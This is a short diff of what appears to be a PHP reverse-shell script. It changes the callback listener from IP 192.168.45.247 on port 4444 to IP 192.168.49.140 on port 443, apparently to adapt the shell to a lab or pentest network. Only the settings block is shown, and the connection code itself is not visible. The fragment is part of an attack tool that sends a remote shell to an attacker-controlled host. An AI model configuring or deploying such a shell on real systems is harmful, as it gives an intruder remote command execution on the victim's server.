@@ -4,8 +4,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.45.247';
-$port = 4444;
+$ip = '192.168.49.140';
+$port = 443;
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
